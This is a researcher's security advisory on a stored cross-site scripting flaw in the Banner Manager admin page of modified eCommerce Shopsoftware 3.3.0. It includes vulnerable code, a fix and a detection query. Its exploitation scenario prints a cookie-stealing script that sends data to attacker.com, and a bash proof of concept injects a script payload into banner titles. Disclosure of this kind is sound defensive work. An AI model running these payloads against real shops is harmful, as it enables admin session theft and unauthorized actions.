# Security Advisory: Stored Cross-Site Scripting via Banner Title (Admin Panel)

> **Identifier:** Pending CVE assignment
> **Publication Date:** 16/11/2026
> **Last Updated:** 16/11/2026
> **Severity:** Medium
> **CVSS:** 4.8 — `CVSS:3.1/AV:N/AC:L/PR:H/UI:R/S:C/C:L/I:L/A:N`
> **CWE:** CWE-79: Improper Neutralization of Input During Web Page Generation ('Cross-site Scripting') — Stored
> **Status:** Unpatched

---

## 1. Executive Summary

modified eCommerce Shopsoftware v3.3.0 contains a Stored Cross-Site Scripting vulnerability in the admin panel's Banner Manager listing page. The `banners_title` field is saved using `xtc_db_prepare_input()` (which only calls `trim()` and `stripslashes()`) and is echoed in the banner listing table and info box without `htmlspecialchars()`. Any admin-injected script payload persists in the database and executes in the browser of any admin user who opens the Banner Manager listing.

---

## 2. Affected Products

| Product / Component | Affected Versions | Fixed Version | Status |
|---|---|---|---|
| modified eCommerce Shopsoftware | ≤ 3.3.0 (rev 16825) | None | Affected |
| Component: admin/banner_manager.php | rev 16825 | None | Affected |
| Database table: banners (column: banners_title) | rev 16825 | None | Affected |

- **Repository / Ecosystem:** https://www.modified-shop.org
- **Evaluated stack:** PHP 8.1.34, Apache 2.4, MariaDB 10.6, Debian Linux (Docker)

---

## 3. Vulnerability Description

Banner title is stored in `admin/banner_manager.php`:

```php
// admin/banner_manager.php:98,124
$banners_title = xtc_db_prepare_input($_POST['banners_title'][$languages[$i]['id']]);
// xtc_db_prepare_input = trim() + stripslashes() — no HTML encoding
```

It is inserted into the `banners` table column `banners_title`.

Three separate echo points in the banner listing and info box render it without `htmlspecialchars()`:

```php
// admin/banner_manager.php:666 — listing table
<td class="dataTableContent"><?php echo $banners['banners_title']; ?></td>

// admin/banner_manager.php:698 — info box heading (selected row)
$heading[] = array('text' => '<b>' . $bInfo->banners_title . '</b>');

// admin/banner_manager.php:701 — info box content
$contents[] = array('text' => '<br /><b>' . $bInfo->banners_title . '</b>');
```

### Necessary Conditions

- **Authentication:** Admin (to set up payload and trigger)
- **User interaction:** Required — victim admin must open the Banner Manager listing
- **Attack vector:** Network

---

## 4. Impact

- **Confidentiality:** Low — session cookies (non-HttpOnly), admin page content
- **Integrity:** Low — CSRF token theft enables further admin actions
- **Availability:** None

Admin-to-admin XSS allows privilege escalation within the admin panel: a lower-privilege admin can steal a higher-privilege admin's session token or CSRF token and perform unauthorized actions.

---

## 5. Classification

### CVSS

- **Score:** 4.8
- **Severity:** Medium
- **Vector:** `CVSS:3.1/AV:N/AC:L/PR:H/UI:R/S:C/C:L/I:L/A:N`

| Metric | Value |
|---|---|
| Attack Vector (AV) | Network |
| Attack Complexity (AC) | Low |
| Privileges Required (PR) | High |
| User Interaction (UI) | Required |
| Scope (S) | Changed |
| Confidentiality (C) | Low |
| Integrity (I) | Low |
| Availability (A) | None |

### CWE

- CWE-79: Improper Neutralization of Input During Web Page Generation (Stored XSS)

### CAPEC

- CAPEC-198: XSS Stored

---

## 6. Exploitation Scenario

1. Admin injects JavaScript payload in a banner title: `<script>document.location='http://attacker.com/?c='+document.cookie</script>`
2. Payload stored in `banners.banners_title` without encoding.
3. Any admin who opens Admin → Marketing → Banner Manager sees the banner listing.
4. The unencoded script tag in the table row executes, stealing the admin's session cookie or CSRF token.
5. Attacker uses stolen CSRF token to perform unauthorized admin actions (e.g., modify shop settings, inject content on public pages).

---

## 7. Technical Evidence

### Affected Component

```text
File(s): admin/banner_manager.php:98,124,666,698,701
Database table: banners (column: banners_title)
Parameter(s): banners_title[<lang_id>] (POST — admin input)
Method: POST (inject) + GET (trigger — admin opens Banner Manager)
Authentication: Admin required for both
```

### Code Path

```php
// 1. Store (banner_manager.php:98):
$banners_title = xtc_db_prepare_input($_POST['banners_title'][$languages[$i]['id']]);
// xtc_db_prepare_input = trim() + stripslashes() — no HTML encoding

// 2. Display — 3 echo points without htmlspecialchars():
// Line 666:
echo $banners['banners_title'];
// Line 698:
$heading[] = array('text' => '<b>' . $bInfo->banners_title . '</b>');
// Line 701:
$contents[] = array('text' => '<br /><b>' . $bInfo->banners_title . '</b>');
```

### Example Request (inject payload — admin)

```http
POST /admin/banner_manager.php?action=new_banner HTTP/1.1
Host: TARGET
Cookie: MODsid=<ADMIN_SESSION_ID>
Content-Type: multipart/form-data; boundary=----Boundary

------Boundary
Content-Disposition: form-data; name="securityToken"

<CSRF_VALUE>
------Boundary
Content-Disposition: form-data; name="banners_title[1]"

<script>alert(document.cookie)</script>
------Boundary
Content-Disposition: form-data; name="html_text[1]"

Normal banner content
------Boundary
Content-Disposition: form-data; name="banners_group"

DEFAULT
------Boundary
Content-Disposition: form-data; name="status"

1
------Boundary--
```

### Example Request (trigger — admin opens listing)

```http
GET /admin/banner_manager.php HTTP/1.1
Host: TARGET
Cookie: MODsid=<ADMIN_SESSION_ID>
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0
```

### Observed Response

```html
HTTP/1.1 200 OK

<td class="dataTableContent"><script>alert(document.cookie)</script></td>
```

---

## 8. Proof of Concept

```bash
#!/bin/bash
# V17 PoC — Stored XSS via banners_title (admin panel)
TARGET="${TARGET:-http://localhost:9080}"
UA="Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0"

# Step 1: Admin login
SID=$(curl -s -b /tmp/admin_cookies_v17.txt -c /tmp/admin_cookies_v17.txt \
  -H "User-Agent: $UA" \
  -X POST "$TARGET/admin/login.php?action=process" \
  -d "username=admin%40shop.local&password=admin123&redirect=" \
  -D - -o /dev/null 2>/dev/null | grep -i "set-cookie.*MODsid" | \
  grep -oP '(?<=MODsid=)[^;]+' | head -1)

echo "[*] Session: $SID"

# Step 2: Get CSRF token
CSRF=$(curl -s -b "MODsid=$SID" -H "User-Agent: $UA" \
  "$TARGET/admin/banner_manager.php" | \
  grep -oP '(?<=name="securityToken" value=")[^"]+' | head -1)

echo "[*] CSRF: $CSRF"

# Step 3: Create banner with XSS in title
curl -s -b "MODsid=$SID" -H "User-Agent: $UA" \
  -X POST "$TARGET/admin/banner_manager.php?action=new_banner" \
  -F "securityToken=$CSRF" \
  -F 'banners_title[1]=<script>alert(document.cookie)</script>' \
  -F "html_text[1]=Normal content" \
  -F "banners_group=DEFAULT" \
  -F "status=1" \
  -o /dev/null

BANNER_ID=$(docker exec modifiedshop_db mysql -ushopuser -pshoppassword modified_shop \
  -e "SELECT MAX(banners_id) FROM banners;" 2>/dev/null | tail -1)
echo "[*] Banner ID: $BANNER_ID"

# Step 4: Admin opens banner listing (trigger)
RESP=$(curl -s -b "MODsid=$SID" -H "User-Agent: $UA" \
  "$TARGET/admin/banner_manager.php")

if echo "$RESP" | grep -q "alert(document.cookie)"; then
  echo "[+] VULNERABLE: XSS payload found unencoded in admin banner listing"
else
  echo "[-] Payload not found"
fi

# Cleanup
docker exec modifiedshop_db mysql -ushopuser -pshoppassword modified_shop \
  -e "DELETE FROM banners WHERE banners_id='$BANNER_ID';" 2>/dev/null
```

### Expected Result

```text
[+] VULNERABLE: XSS payload found unencoded in admin banner listing
```

---

## 9. Reproduction Steps

1. Log in as admin.
2. Navigate to Admin → Marketing → Banner Manager → New Banner.
3. In "Banner Title" field, enter `<script>alert(1)</script>`. Set group, status Active. Save.
4. Navigate back to Admin → Marketing → Banner Manager (listing page).
5. Browser executes `alert(1)` — confirm Stored XSS in admin panel.

---

## 10. Mitigation

- Apply `htmlspecialchars($banners_title, ENT_QUOTES, 'UTF-8')` at all three echo points (lines 666, 698, 701) in `admin/banner_manager.php`.
- Apply a consistent output encoding wrapper to all admin listing pages.

---

## 11. Fix

**No official fix as of 16/11/2026.**

```php
// admin/banner_manager.php:666 — Vulnerable:
echo $banners['banners_title'];

// Fixed:
echo htmlspecialchars($banners['banners_title'], ENT_QUOTES, 'UTF-8');

// Also fix lines 698 and 701:
$heading[] = array('text' => '<b>' . htmlspecialchars($bInfo->banners_title, ENT_QUOTES, 'UTF-8') . '</b>');
$contents[] = array('text' => '<br /><b>' . htmlspecialchars($bInfo->banners_title, ENT_QUOTES, 'UTF-8') . '</b>');
```

---

## 12. Detection and Indicators

- `banners` table column `banners_title` containing `<script>` or event handler attributes.
- GET to `admin/banner_manager.php` returning script tags in response.

```sql
SELECT banners_id, banners_title
FROM banners
WHERE banners_title LIKE '%<%';
```

---

## 13. Disclosure Timeline

| Date | Event |
|---|---|
| 16/11/2026 | Identified via code review |
| 16/11/2026 | Confirmed: 3 echo points without htmlspecialchars() in admin panel |
| 16/11/2026 | Advisory prepared |
| pending | Vendor notified |
| pending | CVE requested |

---

## 14. Vendor Communication

- **Vendor / Maintainer:** modified-shop.org team
- **Channel used:** Pending
- **Response status:** Awaiting response

---

## 15. Credits

- **Researcher:** Luan Oliveira Ferreira de Almeida
- **Organization:** Independent security researcher
- **Contact:** oliveira.luanalmeida@gmail.com / https://github.com/luan-oliveira01

---

## 16. References

- CWE-79: https://cwe.mitre.org/data/definitions/79.html
- OWASP XSS: https://owasp.org/www-community/attacks/xss/
- CVSS calculator: https://www.first.org/cvss/calculator/3.1

---

## 17. Revision History

| Version | Date | Change |
|---|---|---|
| 1.0 | 16/11/2026 | Initial publication |

---

## 18. Legal Notice

This advisory is published for educational, defensive, and security improvement purposes.

---

## 19. Contact

- **Email:** oliveira.luanalmeida@gmail.com
- **Repository:** https://github.com/luan-oliveira01
